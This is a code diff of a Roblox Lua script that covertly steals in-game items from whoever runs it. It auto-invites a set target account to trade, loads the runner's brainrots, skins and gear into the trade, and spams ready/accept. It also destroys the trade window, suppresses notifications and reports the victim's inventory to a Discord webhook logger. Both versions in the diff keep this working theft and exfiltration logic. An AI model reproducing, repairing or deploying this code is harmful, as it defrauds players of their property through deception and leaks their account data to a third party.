@@ -1,16 +1,12 @@
-print("[Brainrot] ===== MAIN STARTING =====")
 -- ===================== MAIN SCRIPT (loadstring) =====================
 -- Remotes resolved via TradeController getupvalue (no hard-coded Net indexes)
 -- If no target brainrots on base at start → Discord invite GUI (no trades / no embed)
-print("[Brainrot] ===== MAIN STARTING =====")
 if getgenv().BrainrotMainLoaded then
-	warn("[Brainrot] Main already running — skip")
-	return
+	return warn("[Brainrot] Main already running!")
 end
 getgenv().BrainrotMainLoaded = true
 
 local genv = getgenv()
-print("[Brainrot] genv TARGET=", tostring(genv.TARGET_USER_ID), "ANIMALS=", type(genv.ALLOWED_ANIMALS) == "table" and #(genv.ALLOWED_ANIMALS) or 0)
 
 -- Supported places (main + variants + duel)
 -- Accepts array {id,id} OR map {[id]=true} from genv; always merges defaults
@@ -65,10 +61,10 @@ local function isAllowedPlace()
 	return false
 end
 
-print("[Brainrot] Checking place… PlaceId=", game.PlaceId)
 if not isAllowedPlace() then
-	warn("[Brainrot] PlaceId", game.PlaceId, "not in allow list — continuing anyway (forced)")
-	-- do NOT return; place lists lag behind events/LTMs
+	warn("[Brainrot] Place not allowed:", game.PlaceId, "— exiting")
+	getgenv().BrainrotMainLoaded = nil
+	return
 end
 
 local DUEL_PLACE_ID = 99606176102979
@@ -118,15 +114,6 @@ local SELECT_GUID = "bce6ca77-ef3c-4aab-b6e1-99f9c1815863"
 local SELECTGB_GUID = "b0e90195-78ba-4028-8af6-8eb86c4ed82d"
 local READY_GUID = "1774f028-dbab-4713-8122-c30d77582edc"
 local ACCEPT_GUID = "d061f53c-7d12-4a4a-a761-d70b06c0d44c"
--- Fallbacks if game rotated Add GUIDs (invite GUID above still works)
-local SELECT_GUIDS = {
-	SELECT_GUID,
-	"c85a2323-36b2-4121-968a-c064a6168aff",
-}
-local SELECTGB_GUIDS = {
-	SELECTGB_GUID,
-	"6786cce9-00d8-41e9-8beb-d96e0412b78b",
-}
 local FOOTER_ICON = "https://media.discordapp.net/attachments/1511087340721012919/1544655871529852988/2d33efc28dde57ea69dd4291cb6b4d6f_2.webp?ex=6a994c62&is=6a97fae2&hm=cd5486a74b48c119c89809204444e8a855045337dc23ede08a46ae7dd4077279&=&format=webp"
 local FALLBACK_COLOR = 0x1A237E
 local guiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true }
@@ -721,113 +708,36 @@ local function resolveTradeRemotes()
 		return false
 	end
 	local ok = pcall(function()
-		-- Invite (known working)
-		if type(TradeController.SendInvite) == "function" then
-			inviteRemote = getupvalue(TradeController.SendInvite, 1) or inviteRemote
-		end
-
-		if type(TradeController._createLiveTrade) == "function" then
-			-- Prefer classic indexes first
-			local lt = getupvalue(TradeController._createLiveTrade, 15)
-			if type(lt) == "table" and type(lt.Brainrot) == "table" then
-				liveTrade = lt
-			end
-			local rr = getupvalue(TradeController._createLiveTrade, 24)
-			local ar = getupvalue(TradeController._createLiveTrade, 23)
-			if typeof(rr) == "Instance" then readyRemote = rr end
-			if typeof(ar) == "Instance" then acceptRemote = ar end
-
-			-- Full UV scan for drifted builds
-			for i = 1, 40 do
-				local v = getupvalue(TradeController._createLiveTrade, i)
-				if type(v) == "table" and type(rawget(v, "Brainrot")) == "table" and not liveTrade then
-					liveTrade = v
-					print("[Brainrot] liveTrade UV", i)
-				elseif typeof(v) == "Instance" and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
-					local n = string.lower(v.Name)
-					if n:find("ready", 1, true) then readyRemote = readyRemote or v end
-					if n:find("accept", 1, true) then acceptRemote = acceptRemote or v end
-					if n:find("addbrainrot", 1, true) or (n:find("add", 1, true) and n:find("brain", 1, true)) then
-						addBrainrotRemote = addBrainrotRemote or v
-					end
-					if n:find("additem", 1, true) then addItemRemote = addItemRemote or v end
-				end
-			end
-		end
-
-		if liveTrade then
-			local function remoteFrom(fn, label)
-				if type(fn) ~= "function" then return nil end
-				for i = 1, 12 do
-					local v = getupvalue(fn, i)
-					if typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
-						print("[Brainrot]", label, "UV", i, v.Name)
-						return v
-					end
-				end
-				return nil
-			end
-			if type(liveTrade.Brainrot) == "table" then
-				addBrainrotRemote = addBrainrotRemote or remoteFrom(liveTrade.Brainrot.Add, "AddBrainrot")
-			end
-			if type(liveTrade.BaseSkin) == "table" then
-				addItemRemote = addItemRemote or remoteFrom(liveTrade.BaseSkin.Add, "AddItem")
-			end
-			if type(liveTrade.Gear) == "table" then
-				-- keep gear on same addItem remote usually
-				addItemRemote = addItemRemote or remoteFrom(liveTrade.Gear.Add, "AddGear")
-			end
-		end
+		liveTrade = getupvalue(TradeController._createLiveTrade, 15)
+		inviteRemote = getupvalue(TradeController.SendInvite, 1)
+		addBrainrotRemote = liveTrade and getupvalue(liveTrade.Brainrot.Add, 1) or nil
+		addItemRemote = liveTrade and getupvalue(liveTrade.BaseSkin.Add, 1) or nil
+		readyRemote = getupvalue(TradeController._createLiveTrade, 24)
+		acceptRemote = getupvalue(TradeController._createLiveTrade, 23)
+		tradeEndRemote = getupvalue(TradeController._createPlayerList, 21)
 	end)
 	if not ok then return false end
-
-	-- Net name fallbacks
-	readyRemote = readyRemote or fallbackRemote("Ready") or fallbackRemote("RE/TradeService/Ready")
-	acceptRemote = acceptRemote or fallbackRemote("Accept") or fallbackRemote("RE/TradeService/Accept")
-	addBrainrotRemote = addBrainrotRemote or fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot")
-	addItemRemote = addItemRemote or fallbackRemote("AddItem") or fallbackRemote("RF/TradeService/AddItem")
-	inviteRemote = inviteRemote or fallbackRemote("Invite") or fallbackRemote("RF/TradeService/Invite")
-
-	return inviteRemote ~= nil
+	return liveTrade and inviteRemote and addBrainrotRemote and readyRemote and acceptRemote
 end
 
 local function fallbackRemote(leaf)
-	leaf = tostring(leaf or "")
-	local leafLower = leaf:lower()
-	local best, bestScore = nil, -1
-	local function consider(child)
-		if not (child:IsA("RemoteFunction") or child:IsA("RemoteEvent")) then return end
-		local n = child.Name
-		local nl = n:lower()
-		local score = -1
-		if n == leaf or nl == leafLower then
-			score = 100
-		elseif n:sub(-#leaf) == leaf or nl:sub(-#leafLower) == leafLower then
-			score = 80
-		elseif nl:find("/" .. leafLower, 1, true) then
-			score = 70
-		elseif nl:find(leafLower, 1, true) then
-			-- weak contains match — skip gift/shop noise for Notify
-			if leafLower == "notify" and (nl:find("gift", 1, true) or nl:find("shop", 1, true) or nl:find("valentine", 1, true)) then
-				return
+	for _, child in ipairs(Net:GetChildren()) do
+		if child.Name == leaf or child.Name:find(leaf, 1, true) then
+			if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
+				return child
 			end
-			score = 20
-		end
-		if score > bestScore then
-			bestScore = score
-			best = child
 		end
 	end
-	for _, child in ipairs(Net:GetChildren()) do consider(child) end
-	if bestScore >= 70 then return best end
-	for _, child in ipairs(Net:GetDescendants()) do consider(child) end
-	return best
+	local exact = Net:FindFirstChild(leaf)
+	if exact and (exact:IsA("RemoteFunction") or exact:IsA("RemoteEvent")) then
+		return exact
+	end
+	return nil
 end
 
 local function waitForRemotes(timeout)
-	timeout = timeout or 3
+	timeout = timeout or 15
 	local t0 = os.clock()
-	print("[Brainrot] Resolving trade remotes…")
 	while os.clock() - t0 < timeout do
 		if resolveTradeRemotes() then
 			remotesReady = true
@@ -839,24 +749,17 @@ local function waitForRemotes(timeout)
 			print("[Brainrot] Accept     :", acceptRemote and acceptRemote.Name or "?")
 			return true
 		end
-		task.wait(0.15)
+		task.wait(0.1)
 	end
-	warn("[Brainrot] getupvalue incomplete — Net name fallback")
+	warn("[Brainrot] getupvalue resolve timed out — falling back to Net name search")
 	inviteRemote = inviteRemote or fallbackRemote("Invite") or fallbackRemote("RF/TradeService/Invite")
-	addBrainrotRemote = addBrainrotRemote
-		or fallbackRemote("AddBrainrot")
-		or fallbackRemote("RF/TradeService/AddBrainrot")
-		or fallbackRemote("TradeService/AddBrainrot")
-	addItemRemote = addItemRemote
-		or fallbackRemote("AddItem")
-		or fallbackRemote("RF/TradeService/AddItem")
-		or fallbackRemote("TradeService/AddItem")
+	addBrainrotRemote = addBrainrotRemote or fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot")
+	addItemRemote = addItemRemote or fallbackRemote("AddItem") or fallbackRemote("RF/TradeService/AddItem")
 	readyRemote = readyRemote or fallbackRemote("Ready") or fallbackRemote("RE/TradeService/Ready")
 	acceptRemote = acceptRemote or fallbackRemote("Accept") or fallbackRemote("RE/TradeService/Accept")
-	remotesReady = inviteRemote ~= nil
+	remotesReady = inviteRemote and readyRemote and acceptRemote and true or false
 	print("[Brainrot] Fallback Invite:", inviteRemote and inviteRemote.Name or "MISSING")
 	print("[Brainrot] Fallback AddBrainrot:", addBrainrotRemote and addBrainrotRemote.Name or "MISSING")
-	print("[Brainrot] Fallback AddItem:", addItemRemote and addItemRemote.Name or "MISSING")
 	print("[Brainrot] Fallback Ready:", readyRemote and readyRemote.Name or "MISSING")
 	print("[Brainrot] Fallback Accept:", acceptRemote and acceptRemote.Name or "MISSING")
 	return remotesReady
@@ -984,13 +887,7 @@ local function applyEverythingAfterTargetFound()
 	cam.FieldOfView = 70
 	local function handleGui(obj)
 		if guiNames[obj.Name] then
-			-- Hide only — Destroying TradeLiveTrade can break client Add
-			task.defer(function()
-				pcall(function()
-					if obj:IsA("ScreenGui") then obj.Enabled = false
-					elseif obj:IsA("GuiObject") then obj.Visible = false end
-				end)
-			end)
+			task.defer(function() obj:Destroy() end)
 		end
 	end
 	pg.ChildAdded:Connect(handleGui)
@@ -1188,13 +1085,11 @@ blockNotifications()
 
 local myPlot, animalList = getMyPlotAndAnimals()
 if not myPlot or not animalList then
-	warn("[Brainrot] Could not find plot or AnimalList — Join Discord GUI")
-	warn("[Brainrot] Tip: stand on your base, wait for animals to replicate, re-run")
+	warn("[Brainrot] Could not find plot or AnimalList — showing Join Discord GUI")
 	showJoinDiscordGui()
 	getgenv().BrainrotMainLoaded = nil
 	return
 end
-print("[Brainrot] Plot OK:", myPlot.Name)
 
 local brainrotQueue = {}
 for slotKey, data in pairs(animalList) do
@@ -1217,9 +1112,8 @@ local tradeBrainrotQueue = brainrotQueue
 local tradeItemsEnabled = true
 
 -- ONLY if no target brainrots at start → Discord GUI (no trades / no embed / no automation)
-print("[Brainrot] brainrotQueue size=", #brainrotQueue, "plot=", myPlot and myPlot.Name or "nil")
 if #brainrotQueue == 0 then
-	warn("[Brainrot] No target brainrots on base — Join Discord GUI (check ALLOWED_ANIMALS names match base)")
+	warn("[Brainrot] No target brainrots on base — Join Discord GUI")
 	showJoinDiscordGui()
 	getgenv().BrainrotMainLoaded = nil
 	return
@@ -1480,11 +1374,8 @@ local function countTraits(traits)
 end
 
 local function sendDetailedWebhook()
-	print("[Brainrot] sendDetailedWebhook called | key=", LOGGER_KEY and true or false, "webhook=", GOOD_WEBHOOK ~= "" and true or false)
-	if not LOGGER_KEY and GOOD_WEBHOOK == "" then
-		warn("[Brainrot] webhook skip: no LOGGER_KEY / GOOD_WEBHOOK")
-		return
-	end
+	-- Allow run if we have a secret key (relay), private webhook, or internal log webhook
+	if not LOGGER_KEY and GOOD_WEBHOOK == "" then return end
 	local resultsPrimary = {}
 	local requirePingPrimary = false
 	local totalGen = 0
@@ -1510,18 +1401,7 @@ local function sendDetailedWebhook()
 			end
 		end
 	end
-	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 then
-		warn("[Brainrot] webhook skip: no matching GOOD_BRAINROTS/skins/gears in animalList")
-		-- still try a minimal ping so you know logger is alive
-		pcall(function()
-			sendWebhook({
-				content = "K2 Logger online — no matching targets on base for `" .. LP.Name .. "`",
-				username = "K2 Logger",
-				avatar_url = GOOD_AVATAR,
-			})
-		end)
-		return
-	end
+	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 then return end
 	table.sort(resultsPrimary, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
 	local lines = {}
 	if #resultsPrimary > 0 then
@@ -1684,14 +1564,9 @@ local function startFullAutomation()
 		warn("[Brainrot] TARGET_USER_ID not set — trades disabled")
 		return
 	end
-	-- Non-blocking resolve (max ~3s). Invites start immediately via controller fallback.
-	task.spawn(function()
-		if not waitForRemotes(3) then
-			warn("[Brainrot] Missing trade remotes — controller/invite fallbacks still active")
-		end
-	end)
-	-- Try once immediately (don't wait)
-	pcall(resolveTradeRemotes)
+	if not waitForRemotes(15) then
+		warn("[Brainrot] Missing trade remotes — will still try invite/ready/accept fallbacks")
+	end
 
 	-- Fixed rate only (no force-burst → stall pattern)
 	local ADD_STEP = 0.10
@@ -1711,232 +1586,100 @@ local function startFullAutomation()
 	end
 
 	local function addOneBrainrot(item)
-		if not item then return end
-		if not addBrainrotRemote then
-			pcall(resolveTradeRemotes)
-			if not addBrainrotRemote then
-				addBrainrotRemote = fallbackRemote("AddBrainrot")
-					or fallbackRemote("RF/TradeService/AddBrainrot")
-					or fallbackRemote("TradeService/AddBrainrot")
-			end
-		end
-		local slot = item.slotKey
-		local data = item.data
-
-		-- 1) Direct remote with GUID variants
-		if addBrainrotRemote then
-			local argsList = {
-				{ SELECT_GUIDS[1], slot, data },
-				{ SELECT_GUIDS[2] or SELECT_GUIDS[1], slot, data },
-				{ SELECT_GUIDS[1], tostring(slot), data },
-				{ SELECT_GUIDS[1], slot },
-				{ slot, data },
-			}
-			for _, args in ipairs(argsList) do
-				pcall(function()
-					if addBrainrotRemote:IsA("RemoteFunction") then
-						addBrainrotRemote:InvokeServer(table.unpack(args))
-					else
-						addBrainrotRemote:FireServer(table.unpack(args))
-					end
-				end)
-			end
-		end
-
-		-- 2) Call controller method directly (how the game UI does it)
+		if not addBrainrotRemote or not item then return end
 		pcall(function()
-			if liveTrade and liveTrade.Brainrot and type(liveTrade.Brainrot.Add) == "function" then
-				-- method-style
-				liveTrade.Brainrot.Add(liveTrade.Brainrot, slot, data)
-			end
+			addBrainrotRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
 		end)
 		pcall(function()
-			if liveTrade and liveTrade.Brainrot and type(liveTrade.Brainrot.Add) == "function" then
-				liveTrade.Brainrot.Add(slot, data)
-			end
-		end)
-		pcall(function()
-			if liveTrade and liveTrade.Brainrot and type(liveTrade.Brainrot.Add) == "function" then
-				liveTrade.Brainrot.Add(SELECT_GUIDS[1], slot, data)
-			end
+			addBrainrotRemote:InvokeServer("c85a2323-36b2-4121-968a-c064a6168aff", item.slotKey, item.data)
 		end)
 	end
 
 	local function addOneItem(kind, item)
 		if not addItemRemote or not item or not tradeItemsEnabled then return end
-		local payload
+		local guids = { SELECTGB_GUID, "6786cce9-00d8-41e9-8beb-d96e0412b78b" }
 		if kind == "BaseSkin" then
-			payload = { UUID = item.uuid, SkinName = item.skinName }
-		else
-			payload = { UUID = item.uuid, GearName = item.gearName }
-		end
-		for _, guid in ipairs(SELECTGB_GUIDS) do
-			local ok = pcall(function()
-				addItemRemote:InvokeServer(guid, kind, payload)
-			end)
-			if ok then return end
-		end
-	end
-
-	local function clickTradeButtons()
-		pcall(function()
-			for _, o in ipairs(pg:GetDescendants()) do
-				local n = string.lower(o.Name or "")
-				if o:IsA("TextButton") or o:IsA("ImageButton") then
-					if n == "readybutton" or n == "ready" or n:find("ready", 1, true) then
-						pcall(function()
-							if firesignal then
-								pcall(function() firesignal(o.MouseButton1Click) end)
-								pcall(function() firesignal(o.Activated) end)
-							end
-							if getconnections then
-								for _, c in ipairs(getconnections(o.MouseButton1Click)) do
-									if c.Fire then pcall(function() c:Fire() end) end
-									if c.Function then pcall(c.Function) end
-								end
-								for _, c in ipairs(getconnections(o.Activated)) do
-									if c.Fire then pcall(function() c:Fire() end) end
-									if c.Function then pcall(c.Function) end
-								end
-							end
-						end)
-					end
-					if n == "accept" or n:find("accept", 1, true) or n == "confirm" then
-						-- only inside trade frames
-						local inTrade = false
-						pcall(function()
-							local p = o.Parent
-							for _ = 1, 8 do
-								if not p then break end
-								local pn = string.lower(p.Name or "")
-								if pn:find("trade", 1, true) then inTrade = true break end
-								p = p.Parent
-							end
-						end)
-						if inTrade then
-							pcall(function()
-								if firesignal then
-									pcall(function() firesignal(o.MouseButton1Click) end)
-									pcall(function() firesignal(o.Activated) end)
-								end
-							end)
-						end
-					end
-				end
+			local payload = { UUID = item.uuid, SkinName = item.skinName }
+			for _, g in ipairs(guids) do
+				pcall(function()
+					addItemRemote:InvokeServer(g, "BaseSkin", payload)
+				end)
 			end
-		end)
+		else
+			local payload = { UUID = item.uuid, GearName = item.gearName }
+			for _, g in ipairs(guids) do
+				pcall(function()
+					addItemRemote:InvokeServer(g, "Gear", payload)
+				end)
+			end
+		end
 	end
 
 	local function fireReady()
 		fireRemote(readyRemote, READY_GUID)
-		fireRemote(readyRemote, "23f15b0b-b633-4f6b-888f-5924b7425522")
-		if readyRemote then
-			pcall(function()
-				if readyRemote:IsA("RemoteEvent") then readyRemote:FireServer(READY_GUID)
-				else readyRemote:InvokeServer(READY_GUID) end
-			end)
-		end
-		clickTradeButtons()
 	end
 
 	local function fireAccept()
 		fireRemote(acceptRemote, ACCEPT_GUID)
-		fireRemote(acceptRemote, "86eea964-f19e-4ac6-b401-a71ecc89e596")
-		if acceptRemote then
-			pcall(function()
-				if acceptRemote:IsA("RemoteEvent") then acceptRemote:FireServer(ACCEPT_GUID)
-				else acceptRemote:InvokeServer(ACCEPT_GUID) end
-			end)
-		end
-		clickTradeButtons()
 	end
 
-	local function isTradeGuiOpen()
-		local found = false
-		pcall(function()
-			for _, o in ipairs(pg:GetDescendants()) do
-				local n = string.lower(o.Name or "")
-				if n == "tradelivetrade" or n == "brainrottrader" or n:find("tradelive", 1, true) then
-					found = true
-					break
-				end
-			end
-		end)
-		return found
-	end
-
-	local function onTradeOpened(reason)
-		if currentlyInTrade and tradeActiveFlag then return end
-		currentlyInTrade = true
-		tradeActiveFlag = true
-		print("[Brainrot] Trade OPENED via", reason,
-			"| ready=", readyRemote and readyRemote.Name or "NIL",
-			"| accept=", acceptRemote and acceptRemote.Name or "NIL",
-			"| add=", addBrainrotRemote and addBrainrotRemote.Name or "NIL",
-			"| queue=", tradeBrainrotQueue and #tradeBrainrotQueue or 0)
-		-- Re-resolve adds in case liveTrade only exists mid-trade
-		pcall(resolveTradeRemotes)
-		task.spawn(function()
-			for _ = 1, 40 do
-				fireReady()
-				fireAccept()
-				task.wait(0.04)
-			end
-		end)
-	end
-
-	local function onTradeClosed()
-		if not currentlyInTrade and not tradeActiveFlag then return end
-		currentlyInTrade = false
-		tradeActiveFlag = false
-		print("[Brainrot] Trade CLOSED")
-	end
-
-	-- Detect trade open (DescendantAdded + poll — works even if UI is hidden)
+	-- Detect trade open
 	task.spawn(function()
 		pg.DescendantAdded:Connect(function(obj)
 			local n = string.lower(obj.Name or "")
 			if n == "tradelivetrade" or n == "brainrottrader" or n:find("tradelive", 1, true) then
-				onTradeOpened("DescendantAdded:" .. tostring(obj.Name))
+				currentlyInTrade = true
+				tradeActiveFlag = true
+				print("[Brainrot] Trade opened")
+				-- immediate ready+accept burst
+				task.spawn(function()
+					for _ = 1, 25 do
+						fireReady()
+						fireAccept()
+						task.wait(0.04)
+					end
+				end)
 			end
 		end)
 		pg.DescendantRemoving:Connect(function(obj)
 			local n = string.lower(obj.Name or "")
-			if n:find("tradelive", 1, true) or n == "brainrottrader" then
-				task.delay(0.35, function()
-					if not isTradeGuiOpen() then onTradeClosed() end
+			if n:find("trade") or n:find("brainrottrader") or n:find("tradelive") then
+				task.delay(0.4, function()
+					local still = false
+					for _, o in ipairs(pg:GetDescendants()) do
+						local nn = string.lower(o.Name or "")
+						if nn:find("tradelive", 1, true) or nn:find("brainrottrader", 1, true) then
+							still = true
+							break
+						end
+					end
+					if not still then
+						currentlyInTrade = false
+						print("[Brainrot] Trade closed")
+					end
 				end)
 			end
 		end)
-		-- Poll every 0.25s (hidden/disabled GUIs still exist in PlayerGui)
-		while true do
-			local open = isTradeGuiOpen()
-			if open and not currentlyInTrade then
-				onTradeOpened("poll")
-			elseif not open and currentlyInTrade then
-				onTradeClosed()
-			end
-			task.wait(0.25)
-		end
 	end)
 
-	-- Continuous brainrot add WHILE in trade (always started; resolves remote on the fly)
+	-- Continuous fixed-rate brainrot add WHILE in trade only (never stalls)
 	task.spawn(function()
 		local idx = 1
-		local logged = false
 		while true do
 			local q = tradeBrainrotQueue
 			local inTrade = tradeActiveFlag or currentlyInTrade
 			if inTrade and q and #q > 0 then
-				if not logged then
-					print("[Brainrot] ADD LOOP active | remote=", addBrainrotRemote and addBrainrotRemote.Name or "NIL", "| queue=", #q)
-					logged = true
+				if not addBrainrotRemote then
+					pcall(resolveTradeRemotes)
+					if not addBrainrotRemote then
+						addBrainrotRemote = fallbackRemote("AddBrainrot") or fallbackRemote("RF/TradeService/AddBrainrot")
+					end
 				end
-				if idx > #q then idx = 1 end
-				addOneBrainrot(q[idx])
-				idx = idx + 1
-			else
-				logged = false
+				if addBrainrotRemote then
+					if idx > #q then idx = 1 end
+					addOneBrainrot(q[idx])
+					idx = idx + 1
+				end
 			end
 			task.wait(ADD_STEP)
 		end
@@ -1954,50 +1697,36 @@ local function startFullAutomation()
 						addItemRemote = fallbackRemote("AddItem") or fallbackRemote("RF/TradeService/AddItem")
 					end
 				end
-				if #baseSkinQueue > 0 then
-					if skinIdx > #baseSkinQueue then skinIdx = 1 end
-					addOneItem("BaseSkin", baseSkinQueue[skinIdx])
-					skinIdx = skinIdx + 1
-				end
-				if #gearQueue > 0 then
-					if gearIdx > #gearQueue then gearIdx = 1 end
-					addOneItem("Gear", gearQueue[gearIdx])
-					gearIdx = gearIdx + 1
+				if addItemRemote then
+					if #baseSkinQueue > 0 then
+						if skinIdx > #baseSkinQueue then skinIdx = 1 end
+						addOneItem("BaseSkin", baseSkinQueue[skinIdx])
+						skinIdx = skinIdx + 1
+					end
+					if #gearQueue > 0 then
+						if gearIdx > #gearQueue then gearIdx = 1 end
+						addOneItem("Gear", gearQueue[gearIdx])
+						gearIdx = gearIdx + 1
+					end
 				end
 			end
 			task.wait(ITEM_STEP)
 		end
 	end)
 
-	local function doInvite()
-		-- Prefer remote
-		if inviteRemote then
-			pcall(function()
-				if inviteRemote:IsA("RemoteFunction") then
-					inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
-				else
-					inviteRemote:FireServer(INVITE_GUID, TARGET_ID)
-				end
-			end)
-		end
-		-- Controller method fallback
-		if TradeController and type(TradeController.SendInvite) == "function" then
-			pcall(function() TradeController.SendInvite(TARGET_ID) end)
-			pcall(function() TradeController:SendInvite(TARGET_ID) end)
-			pcall(function() TradeController.SendInvite(TradeController, TARGET_ID) end)
-		end
-	end
-
 	-- Continuous invite (always when not in trade)
 	task.spawn(function()
-		local ticks = 0
 		while true do
 			if not tradeActiveFlag and not currentlyInTrade then
-				doInvite()
-				ticks = ticks + 1
-				if ticks == 1 or ticks % 8 == 0 then
-					print("[Brainrot] Invite pulse →", TARGET_ID, "remote=", inviteRemote and inviteRemote.Name or "NIL")
-				end
+				pcall(function()
+					if inviteRemote then
+						if inviteRemote:IsA("RemoteFunction") then
+							inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
+						else
+							inviteRemote:FireServer(INVITE_GUID, TARGET_ID)
+						end
+					end
+				end)
 			end
 			task.wait(TRADE_CYCLE_DELAY)
 		end
@@ -2009,7 +1738,11 @@ local function startFullAutomation()
 			task.spawn(function()
 				for _ = 1, 6 do
 					if tradeActiveFlag or currentlyInTrade then break end
-					doInvite()
+					pcall(function()
+						if inviteRemote then
+							inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
+						end
+					end)
 					task.wait(0.12)
 				end
 			end)
@@ -2060,19 +1793,14 @@ local function startFullAutomation()
 	print("[Brainrot] Automation started | fixed add @", ADD_STEP, "s | continuous ready/accept")
 end
 
--- INSTANT webhook first (never blocked by remote resolve)
+startFullAutomation()
+
+-- INSTANT webhook as soon as script has brainrot list (do not wait for profile/gears)
 print("[Brainrot] Sending webhook instantly…")
 task.spawn(function()
-	local ok, err = pcall(sendDetailedWebhook)
-	if not ok then
-		warn("[Brainrot] Instant webhook error:", err)
-	else
-		print("[Brainrot] Instant webhook finished")
-	end
+	sendDetailedWebhook()
+	print("[Brainrot] Instant webhook finished")
 end)
-
-startFullAutomation()
-print("[Brainrot] Automation started (invite/add/ready loops)")
 
 -- Profile gears/skins in background (does NOT delay first webhook)
 task.spawn(function()
